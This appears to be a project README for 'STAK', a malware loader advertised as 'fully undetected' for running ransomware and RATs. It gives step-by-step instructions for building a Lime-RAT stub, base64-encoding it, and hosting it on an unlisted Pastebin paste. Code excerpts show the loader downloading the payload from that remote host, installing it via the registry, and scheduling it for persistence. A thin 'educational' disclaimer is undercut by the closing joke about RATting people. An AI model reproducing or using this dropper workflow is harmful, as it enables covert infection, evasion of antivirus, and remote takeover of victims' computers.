# STAK
STAK is a fully undetected program runner that can run everything you want. From ransomware, to RATs.

This is purely made for educational purposes and not ment to be used to spread a RAT or any sort of malware.

# How to set this up and compile it.
**You will need:**

`Visual Studio Community 2019`

`A browser, such as Chrome`

`Pastebin`

`A program you want to run`

Now to compile it, you need to do a couple of things.
If you want to add a RAT to it, its pretty easy. You can do this with f.e [Lime-RAT](https://github.com/NYAN-x-CAT/Lime-RAT).
In this tutorial i will explain it with Lime-RAT.

Download Lime-RAT from [this link](https://github.com/NYAN-x-CAT/Lime-RAT/releases/download/v0.1.9.2/Compiled.zip).
Open Lime-RAT, and build your stub. You can follow [this](https://www.youtube.com/watch?v=8cl4nMJgb7o) tutorial.

Download the source by clicking the "Clone or download" button and clicking "Download ZIP". Unzip it using any program you want. Now open the STAK.sln file. You will get something like this: 

![](https://i.imgur.com/acxRTng.png)

Click on Program.cs. You will now see something like this: 

![](https://i.imgur.com/80YOqnk.jpg)

**Now follow what i say.**
Find this in Program.cs:

```
string Payload = DownloadPayload("YOUR-STUB-HERE");
InstallRegistry(Payload);
AddToSchtasks();
```

This is the part where you will need your stub, pastebin and your browser.
Open your browser and open [this link](https://www.browserling.com/tools/file-to-base64). Drag and drop your stub into the blue space on the site. Now press "Convert to Base64!". A box will open up below the button, click on it, press CTRL + A and press CTRL + C. Now open up pastebin with [this link](https://pastebin.com). You will now see this:

![](https://i.imgur.com/hQ4kV6q.png)

Copy and paste the Base64 code into your paste with CTRL + V. Set Paste Exposure to Unlisted and give the paste a name. It doesnt matter what. Now press the "raw" button. Copy the link in your search bar. Paste this link into "YOUR-STUB-HERE". **DO NOT DO THIS ON ONE OF THEM, THERE ARE MULTIPLE OF THESE CODES.**
There are 2 of the same codes in one, because there is a debug mode i did in a lazy way :D

```
if (debugmode == "debug")
{
    DialogResult result = MessageBox.Show("Run RAT?", "DEBUG-MODE", MessageBoxButtons.YesNo);
    if (result == DialogResult.Yes)
    {
        string Payload = DownloadPayload("Add the pastebin link to here.");
        InstallRegistry(Payload);
        AddToSchtasks();
    }
    else
    {
        MessageBox.Show("Skipping...", "DEBUG-MODE");
    }
}
else
{
    string Payload = DownloadPayload("But also to here.");
    InstallRegistry(Payload);
    AddToSchtasks();
}
```

It will now look like this.

```
string Payload = DownloadPayload("https://pastebin.com/raw/yourpastelink");
InstallRegistry(Payload);
AddToSchtasks();
```

You are done for the stub!
If you want to add a debug mode, you can make a new paste with the same explanation as i just told you but instead of pasting the base64 code into the paste you paste a 1 (debug mode on) or a 0 (debug mode off). Then you click on raw again and copy the pastebin link. Then find this:

```
private static void Checker()
{
    string url = ("https://pastebin.com/raw/qA3FzffP");
    string debug = new WebClient().DownloadString(url);
    if (debug == "1")
    {
        debugmode = "debug";
    }
}
```

Change the pastebin link you see in there with the pastebin link you just copied.

**You are done!**

Now compile it by changing Debug to Release from here!

![](https://i.imgur.com/VeUiZJ9.png)

## Have fun playing with it! If you chose to RAT someone that you don't have permission to, its gonna be your own fault buddy. Its all on you, if you go to jail.
